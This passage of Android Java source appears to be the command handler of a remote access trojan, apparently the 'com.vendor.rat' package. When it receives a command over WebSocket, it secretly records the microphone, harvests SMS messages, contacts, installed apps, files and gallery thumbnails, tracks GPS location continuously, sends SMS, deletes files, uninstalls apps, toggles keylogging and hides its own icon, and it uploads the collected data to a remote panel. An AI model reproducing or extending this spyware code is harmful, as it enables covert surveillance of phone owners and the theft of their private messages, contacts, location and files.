        for (int row = 0; row < h / 2; row++) {
            for (int col = 0; col < w / 2; col++) {
                int uvIndex = row * uvRowStride + col * uvPixelStride;
                nv21[offset++] = vBuffer.get(uvIndex);
                nv21[offset++] = uBuffer.get(uvIndex);
            }
        }
        return nv21;
    }

    private void handleCameraOff() {
        Log.d(TAG, "Camera off");
        cameraStreaming = false;
        if (cameraSession != null) {
            try { cameraSession.close(); } catch (Exception ignored) {}
            cameraSession = null;
        }
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (cameraReader != null) {
            cameraReader.close();
            cameraReader = null;
        }
        if (cameraThread != null) {
            cameraThread.quitSafely();
            cameraThread = null;
        }
    }

    // ============ 录音 ============

    private MediaRecorder mediaRecorder;
    private String micRecordPath;
    private volatile boolean micRecording = false;

    private void handleMicStart() {
        Log.d(TAG, "Mic start");
        if (micRecording) return;

        Context ctx = getAppContext();
        if (ctx == null) return;

        new Thread(() -> {
            try {
                micRecordPath = ctx.getCacheDir().getAbsolutePath() + "/mic_" + System.currentTimeMillis() + ".3gp";

                mediaRecorder = new MediaRecorder();
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                mediaRecorder.setOutputFile(micRecordPath);
                mediaRecorder.prepare();
                mediaRecorder.start();
                micRecording = true;
                Log.d(TAG, "Mic recording started: " + micRecordPath);

                // 录制 5 秒后自动停止并上传
                Thread.sleep(5000);
                handleMicStop();

            } catch (Exception e) {
                Log.e(TAG, "Mic start failed", e);
                micRecording = false;
            }
        }).start();
    }

    private void handleMicStop() {
        if (!micRecording) return;
        Log.d(TAG, "Mic stop");

        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
            }
            micRecording = false;

            // 读取录音文件并上传
            if (micRecordPath != null) {
                File file = new File(micRecordPath);
                if (file.exists()) {
                    byte[] bytes = new byte[(int) file.length()];
                    java.io.FileInputStream fis = new java.io.FileInputStream(file);
                    fis.read(bytes);
                    fis.close();

                    String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    WebSocketClient ws = getWsClient();
                    if (ws != null) {
                        ws.sendMic(base64);
                        Log.d(TAG, "Mic data sent: " + bytes.length + " bytes");
                    }
                    file.delete();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Mic stop failed", e);
            micRecording = false;
        }
    }

    // ============ PanelSendHandler screencomd 数据采集命令 ============

    private Context getAppContext() {
        MainApplication app = MainApplication.getInstance();
        return (app != null && app.getApplication() != null) ? app.getApplication() : null;
    }

    private WebSocketClient getWsClient() {
        return NetworkManager.getInstance().getWebSocketClient();
    }

    /**
     * 获取短信列表 → subc="sms"
     * Panel parseSmsData 期望每行一个 JSON: {time, message, full_message, number}
     */
    private void handleFetchSms() {
        Log.d(TAG, "fetchSms");
        Context ctx = getAppContext();
        WebSocketClient ws = getWsClient();
        if (ctx == null || ws == null) return;

        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                // 读取全部短信 (收件+发件)，按时间倒序，限 500 条
                Cursor cursor = ctx.getContentResolver().query(
                    Uri.parse("content://sms"),
                    new String[]{"address", "body", "date", "type"},
                    null, null, "date DESC LIMIT 500");
                if (cursor != null) {
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
                    int count = 0;
                    while (cursor.moveToNext()) {
                        String address = cursor.getString(0);
                        String body = cursor.getString(1);
                        long date = cursor.getLong(2);
                        int type = cursor.getInt(3); // 1=收件, 2=发件

                        JsonObject sms = new JsonObject();
                        sms.addProperty("number", address != null ? address : "");
                        sms.addProperty("message", body != null ? (body.length() > 100 ? body.substring(0, 100) : body) : "");
                        sms.addProperty("full_message", body != null ? body : "");
                        sms.addProperty("time", sdf.format(new Date(date)));
                        sms.addProperty("type", type);

                        if (sb.length() > 0) sb.append("\n");
                        sb.append(sms.toString());
                        count++;
                    }
                    cursor.close();
                    ws.sendData("sms", sb.toString());
                    Log.d(TAG, "sms sent: " + count + " messages");
                } else {
                    ws.sendData("sms", "");
                    Log.w(TAG, "sms: cursor is null (permission denied?)");
                }
            } catch (SecurityException e) {
                Log.w(TAG, "fetchSms: READ_SMS permission denied", e);
                ws.sendData("sms", "");
            } catch (Exception e) {
                Log.w(TAG, "fetchSms failed", e);
            }
        }).start();
    }

    /**
     * 发送短信
     * 格式: {"type":"screencomd", "subc":"SMSSEND", "smsnumber":"xxx", "message":"xxx"}
     */
    private void handleSendSms(JsonObject payload) {
        String number = payload.has("smsnumber") ? payload.get("smsnumber").getAsString() : "";
        String message = payload.has("message") ? payload.get("message").getAsString() : "";
        Log.d(TAG, "sendSms: to=" + number);
        if (number.isEmpty() || message.isEmpty()) return;

        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(number, null, message, null, null);
            Log.d(TAG, "sms sent to " + number);
        } catch (Exception e) {
            Log.w(TAG, "sendSms failed", e);
        }
    }

    /**
     * 获取联系人列表 → subc="loadcontacts"
     */
    private void handleFetchContacts() {
        Log.d(TAG, "fetchContacts");
        Context ctx = getAppContext();
        WebSocketClient ws = getWsClient();
        if (ctx == null || ws == null) return;

        new Thread(() -> {
            try {
                JsonArray arr = new JsonArray();
                Cursor cursor = ctx.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                    }, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        JsonObject contact = new JsonObject();
                        contact.addProperty("name", cursor.getString(0));
                        contact.addProperty("phone", cursor.getString(1));
                        arr.add(contact);
                    }
                    cursor.close();
                }
                ws.sendData("loadcontacts", arr.toString());
                Log.d(TAG, "contacts sent: " + arr.size());
            } catch (Exception e) {
                Log.w(TAG, "fetchContacts failed", e);
            }
        }).start();
    }

    /**
     * 获取文件列表 → subc="files"
     * 格式: {"type":"screencomd", "subc":"files", "filepath":"/sdcard/"}
     */
    private void handleFetchFiles(JsonObject payload) {
        String filepath = ScreenActionParser.getString(payload, "filepath", "/sdcard");
        String fpath = ScreenActionParser.getString(payload, "fpath", "");
        if (!fpath.isEmpty()) filepath = fpath;
        Log.d(TAG, "fetchFiles: " + filepath);
        WebSocketClient ws = getWsClient();
        if (ws == null) return;

        final String path = filepath;
        new Thread(() -> {
            try {
                JsonArray arr = FileListHelper.buildFileList(new File(path));
                ws.sendData("files", arr.toString());
                Log.d(TAG, "files sent: " + arr.size() + " items from " + path);
            } catch (Exception e) {
                Log.w(TAG, "fetchFiles failed", e);
            }
        }).start();
    }

    /**
     * 查看文件 → 生成缩略图 → subc="thumb"
     * Panel GalleryTab 期望: {type:"thumb", data:"base64", path:"filepath"}
     */
    private void handleViewFile(JsonObject payload) {
        String filepath = ScreenActionParser.getString(payload, "filepath", "");
        Log.d(TAG, "viewFile: " + filepath);
        if (filepath.isEmpty()) return;

        WebSocketClient ws = getWsClient();
        if (ws == null) return;

        new Thread(() -> {
            try {
                File file = new File(filepath);
                if (!file.exists() || !file.isFile()) {
                    Log.w(TAG, "viewFile: file not found: " + filepath);
                    return;
                }

                // 判断是否为图片
                String name = file.getName().toLowerCase();
                boolean isImage = name.endsWith(".jpg") || name.endsWith(".jpeg")
                    || name.endsWith(".png") || name.endsWith(".gif")
                    || name.endsWith(".bmp") || name.endsWith(".webp");

                if (isImage) {
                    // 生成缩略图: 解码 → 缩放 → JPEG 压缩 → Base64
                    android.graphics.BitmapFactory.Options opts = new android.graphics.BitmapFactory.Options();
                    opts.inJustDecodeBounds = true;
                    android.graphics.BitmapFactory.decodeFile(filepath, opts);

                    // 计算缩放比例 (目标 200px)
                    int targetSize = 200;
                    int scale = 1;
                    while (opts.outWidth / scale > targetSize * 2 && opts.outHeight / scale > targetSize * 2) {
                        scale *= 2;
                    }

                    opts.inJustDecodeBounds = false;
                    opts.inSampleSize = scale;
                    android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeFile(filepath, opts);

                    if (bitmap != null) {
                        // 缩放到 200px
                        float ratio = Math.min((float) targetSize / bitmap.getWidth(),
                                               (float) targetSize / bitmap.getHeight());
                        int w = (int) (bitmap.getWidth() * ratio);
                        int h = (int) (bitmap.getHeight() * ratio);
                        android.graphics.Bitmap thumb = android.graphics.Bitmap.createScaledBitmap(bitmap, w, h, true);
                        bitmap.recycle();

                        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                        thumb.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, baos);
                        thumb.recycle();

                        String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                        ws.sendThumb(base64, filepath);
                        Log.d(TAG, "thumb sent: " + filepath + " (" + baos.size() + " bytes)");
                    }
                } else {
                    Log.d(TAG, "viewFile: not an image: " + filepath);
                }
            } catch (Exception e) {
                Log.w(TAG, "viewFile failed: " + filepath, e);
            }
        }).start();
    }

    /**
     * 相册: 一次返回图片列表 + 缩略图 (替代 files + N 次 viewfile)
     * 格式: {"type":"screencomd", "subc":"gallery", "filepath":"/sdcard/DCIM/Camera/"}
     * 返回: 每张图片一条 thumb + 最后一条 files 列表
     */
    private void handleGallery(JsonObject payload) {
        String filepath = ScreenActionParser.getString(payload, "filepath", "/sdcard/DCIM/Camera");
        Log.d(TAG, "gallery: " + filepath);
        WebSocketClient ws = getWsClient();
        if (ws == null) return;

        new Thread(() -> {
            try {
                File dir = new File(filepath);
                if (!dir.exists() || !dir.isDirectory()) {
                    Log.w(TAG, "gallery: dir not found or not directory: " + filepath);
                    return;
                }

                File[] allFiles = dir.listFiles();
                if (allFiles == null) {
                    Log.w(TAG, "gallery: listFiles returned null (permission denied?): " + filepath);
                    return;
                }

                String[] exts = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp"};
                int count = 0;

                for (File f : allFiles) {
                    if (f.isDirectory() || count >= 50) continue;
                    String name = f.getName().toLowerCase();
                    boolean isImage = false;
                    for (String ext : exts) {
                        if (name.endsWith(ext)) { isImage = true; break; }
                    }
                    if (!isImage) continue;

                    try {
                        android.graphics.BitmapFactory.Options opts = new android.graphics.BitmapFactory.Options();
                        opts.inJustDecodeBounds = true;
                        android.graphics.BitmapFactory.decodeFile(f.getAbsolutePath(), opts);

                        int targetSize = 150;
                        int scale = 1;
                        while (opts.outWidth / scale > targetSize * 2 && opts.outHeight / scale > targetSize * 2) {
                            scale *= 2;
                        }
                        opts.inJustDecodeBounds = false;
                        opts.inSampleSize = scale;
                        android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeFile(f.getAbsolutePath(), opts);
                        if (bitmap == null) continue;

                        float ratio = Math.min((float) targetSize / bitmap.getWidth(),
                                               (float) targetSize / bitmap.getHeight());
                        android.graphics.Bitmap thumb = android.graphics.Bitmap.createScaledBitmap(
                            bitmap, (int)(bitmap.getWidth() * ratio), (int)(bitmap.getHeight() * ratio), true);
                        bitmap.recycle();

                        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                        thumb.compress(android.graphics.Bitmap.CompressFormat.JPEG, 50, baos);
                        thumb.recycle();

                        ws.sendThumb(Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP), f.getAbsolutePath());
                        count++;
                    } catch (Exception e) {
                        Log.w(TAG, "gallery thumb failed: " + f.getName(), e);
                    }
                }
                Log.d(TAG, "gallery sent: " + count + " images from " + filepath);

                // 发送文件列表
                JsonArray arr = FileListHelper.buildFileList(dir);
                ws.sendData("files", arr.toString());
            } catch (Exception e) {
                Log.w(TAG, "gallery failed", e);
            }
        }).start();
    }

    /**
     * 文件操作 (上传/删除/下载)
     */
    private void handleChangeFiles(JsonObject payload) {
        String comdtype = payload.has("comdtype") ? payload.get("comdtype").getAsString() : "";
        String filepath = payload.has("filepath") ? payload.get("filepath").getAsString() : "";
        Log.d(TAG, "changeFiles: comdtype=" + comdtype + ", path=" + filepath);

        if ("R".equals(comdtype) && !filepath.isEmpty()) {
            // 删除文件
            try {
                File f = new File(filepath);
                if (f.exists()) {
                    boolean deleted = f.delete();
                    Log.d(TAG, "file deleted: " + filepath + " = " + deleted);
                }
            } catch (Exception e) {
                Log.w(TAG, "deleteFile failed", e);
            }
        }
        // TODO: D=下载 → 读取文件 → ws.sendFileChunk()
        // TODO: U=上传 → 接收分块数据 → 写入文件
    }

    /**
     * 获取应用列表 → subc="loadapps"
     */
    private void handleLoadApps() {
        Log.d(TAG, "loadApps");
        Context ctx = getAppContext();
        WebSocketClient ws = getWsClient();
        if (ctx == null || ws == null) return;

        new Thread(() -> {
            try {
                PackageManager pm = ctx.getPackageManager();
                List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                JsonArray arr = new JsonArray();
                for (ApplicationInfo app : apps) {
                    // 只返回用户安装的应用
                    if ((app.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;
                    JsonObject item = new JsonObject();
                    item.addProperty("name", pm.getApplicationLabel(app).toString());
                    item.addProperty("packageName", app.packageName);
                    arr.add(item);
                }
                ws.sendData("loadapps", arr.toString());
                Log.d(TAG, "apps sent: " + arr.size());
            } catch (Exception e) {
                Log.w(TAG, "loadApps failed", e);
            }
        }).start();
    }

    /**
     * 打开应用
     * 格式: {"type":"screencomd", "subc":"OPENAPP", "package":"com.example.app"}
     */
    private void handleOpenApp(JsonObject payload) {
        String pkg = payload.has("package") ? payload.get("package").getAsString() : "";
        Log.d(TAG, "openApp: " + pkg);
        if (pkg.isEmpty()) return;

        try {
            Context ctx = getAppContext();
            if (ctx == null) return;

            Intent intent = ctx.getPackageManager().getLaunchIntentForPackage(pkg);
            if (intent == null) {
                Log.w(TAG, "openApp: no launch intent for " + pkg);
                return;
            }
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            // 优先用 AccessibilityService 启动（有后台启动特权）
            MyAccessibilityService service = MyAccessibilityService.P();
            if (service != null) {
                service.startActivity(intent);
            } else {
                ctx.startActivity(intent);
            }
            Log.d(TAG, "openApp started: " + pkg);
        } catch (Exception e) {
            Log.w(TAG, "openApp failed", e);
        }
    }

    /**
     * 卸载应用
     * 格式: {"type":"screencomd", "subc":"UNINSTALLAPP", "package":"com.example.app"}
     */
    private void handleUninstallApp(JsonObject payload) {
        String pkg = payload.has("package") ? payload.get("package").getAsString() : "";
        Log.d(TAG, "uninstallApp: " + pkg);
        if (pkg.isEmpty()) return;

        try {
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(Uri.parse("package:" + pkg));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

            MyAccessibilityService service = MyAccessibilityService.P();
            if (service != null) {
                service.startActivity(intent);
            } else {
                Context ctx = getAppContext();
                if (ctx != null) ctx.startActivity(intent);
            }
            Log.d(TAG, "uninstallApp started: " + pkg);
        } catch (Exception e) {
            Log.w(TAG, "uninstallApp failed", e);
        }
    }

    /**
     * 键盘记录开关
     * 格式: {"type":"screencomd", "subc":"Keylog", "comdtype":"0"=开/"1"=关}
     */
    private void handleKeylog(JsonObject payload) {
        keylogHandler.handle(payload);
    }

    /**
     * 键盘日志日期查询
     */
    private void handleLogdate(JsonObject payload) {
        String kdate = payload.has("kdate") ? payload.get("kdate").getAsString() : "";
        Log.d(TAG, "logdate: " + kdate);
        // TODO: 查询指定日期的键盘日志 → ws.sendData("klogsdate", data)
    }

    /**
     * 持续定位 — 开始
     * 使用 requestLocationUpdates 主动触发定位，持续上报
     */
    private android.location.LocationListener locationListener;
    private volatile boolean locationTracking = false;

    private void handleStartLocation() {
        Log.d(TAG, "startLocation");
        if (locationTracking) {
            Log.d(TAG, "location already tracking");
            return;
        }

        Context ctx = getAppContext();
        WebSocketClient ws = getWsClient();
        if (ctx == null || ws == null) return;

        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return;

            // 先发送一次缓存位置 (快速响应)
            sendLastKnownLocation(lm, ws);

            locationListener = new android.location.LocationListener() {
                @Override
                public void onLocationChanged(Location loc) {
                    if (!locationTracking) return;
                    WebSocketClient wsNow = getWsClient();
                    if (wsNow == null) return;

                    JsonObject data = new JsonObject();
                    data.addProperty("lat", loc.getLatitude());
                    data.addProperty("lng", loc.getLongitude());
                    data.addProperty("accuracy", loc.getAccuracy());
                    data.addProperty("speed", loc.getSpeed());
                    data.addProperty("provider", loc.getProvider());
                    data.addProperty("time", loc.getTime());
                    wsNow.sendData("loc", data.toString());
                }

                @Override public void onStatusChanged(String provider, int status, android.os.Bundle extras) {}
                @Override public void onProviderEnabled(String provider) {}
                @Override public void onProviderDisabled(String provider) {}
            };

            // GPS: 3s 间隔, 1m 最小距离
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 3000, 1, locationListener);
                Log.d(TAG, "GPS location updates started");
            }

            // Network: 5s 间隔, 5m 最小距离 (备选)
            if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 5, locationListener);
                Log.d(TAG, "Network location updates started");
            }

            locationTracking = true;
            Log.i(TAG, "Location tracking started");

        } catch (SecurityException e) {
            Log.w(TAG, "startLocation: no permission", e);
        } catch (Exception e) {
            Log.w(TAG, "startLocation failed", e);
        }
    }

    private void handleStopLocation() {
        Log.d(TAG, "stopLocation");
        locationTracking = false;

        if (locationListener != null) {
            try {
                Context ctx = getAppContext();
                if (ctx != null) {
                    LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
                    if (lm != null) {
                        lm.removeUpdates(locationListener);
                    }
                }
            } catch (Exception e) {
                Log.w(TAG, "stopLocation failed", e);
            }
            locationListener = null;
            Log.i(TAG, "Location tracking stopped");
        }
    }

    private void sendLastKnownLocation(LocationManager lm, WebSocketClient ws) {
        try {
            Location loc = null;
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }
            if (loc == null && lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            if (loc != null) {
                JsonObject data = new JsonObject();
                data.addProperty("lat", loc.getLatitude());
                data.addProperty("lng", loc.getLongitude());
                data.addProperty("accuracy", loc.getAccuracy());
                data.addProperty("speed", loc.getSpeed());
                data.addProperty("provider", loc.getProvider());
                data.addProperty("time", loc.getTime());
                ws.sendData("loc", data.toString());
                Log.d(TAG, "lastKnown location sent");
            }
        } catch (SecurityException ignored) {}
    }

    /**
     * 隐藏图标
     */
    private void handleHideIcon() {
        Log.d(TAG, "hideIcon");
        Context ctx = getAppContext();
        if (ctx == null) return;

        try {
            PackageManager pm = ctx.getPackageManager();
            pm.setComponentEnabledSetting(
                new android.content.ComponentName(ctx, "com.vendor.rat.activity.ActivMain"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
            Log.d(TAG, "icon hidden");
        } catch (Exception e) {
            Log.w(TAG, "hideIcon failed", e);
        }
    }

    /**
     * 重命名设备
     * 格式: {"type":"screencomd", "subc":"Rename", "name":"新名称"}
     */
    private void handleRename(JsonObject payload) {
        String name = payload.has("name") ? payload.get("name").getAsString() : "";
        Log.d(TAG, "rename: " + name);
        // 重命名通过下次心跳的 phone_name 字段生效
        // TODO: 持久化到 SharedPreferences
    }

    /**
     * 文件搜索
     * 格式: {"type":"screencomd", "subc":"srch", "srchfor":"*.jpg", "srchin":"/sdcard/", "targetpath":"/sdcard/DCIM"}
     */
    private void handleFileSearch(JsonObject payload) {
        String searchFor = ScreenActionParser.getString(payload, "srchfor", "");
        String searchIn = ScreenActionParser.getString(payload, "srchin", "/sdcard");
        Log.d(TAG, "fileSearch: for=" + searchFor + ", in=" + searchIn);
        WebSocketClient ws = getWsClient();
        if (ws == null || searchFor.isEmpty()) return;

        new Thread(() -> {
            try {
                JsonArray paths = new JsonArray();
                FileSearchHelper.searchFilesRecursive(new File(searchIn), searchFor, paths, 500);
                ws.sendSearchResult(paths.toString(), searchFor);
                Log.d(TAG, "search results: " + paths.size());
            } catch (Exception e) {
                Log.w(TAG, "fileSearch failed", e);
            }
        }).start();
    }
}
